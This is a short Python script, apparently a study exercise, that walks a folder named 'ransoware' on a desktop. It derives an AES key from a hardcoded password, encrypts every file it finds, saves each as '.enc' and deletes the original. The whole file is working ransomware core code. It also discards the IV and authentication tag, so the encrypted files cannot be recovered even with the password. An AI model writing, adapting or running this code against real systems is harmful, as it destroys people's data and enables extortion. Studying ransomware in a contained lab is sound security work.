#!/usr/bin/env python3


# pip install cryptography
# pip install pycryptodome

import os
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

password = 'teste123'
salt = b'\x01\x23\x45\x67\x89\xab\xcd\xef'
diretorio = '/home/elizeuopain/Desktop/ransoware/'

def derive_key(password, salt):
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=100000,
        backend=default_backend()
    )
    return kdf.derive(password.encode())
    
def ler_diretorio(diretorio):    
    key = derive_key(password, salt)
    for root, dirs, files in os.walk(diretorio):
        for file in files:
            file_path = os.path.join(root, file)
            encrypt(file_path, key)
	    
def encrypt(file_path, key):     
    with open(file_path, 'rb') as file:
         plaintext = file.read() 
    
    iv = os.urandom(16)  
    cipher = Cipher(algorithms.AES(key), modes.GCM(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    ciphertext = encryptor.update(plaintext) + encryptor.finalize()
    
    arquivo_enc = file_path + '.enc'
    
    with open(arquivo_enc, 'wb') as file:
         file.write(ciphertext)
         
    os.remove(file_path)

def main():
    ler_diretorio(diretorio)
  
if __name__ == '__main__':
    main()

    

    
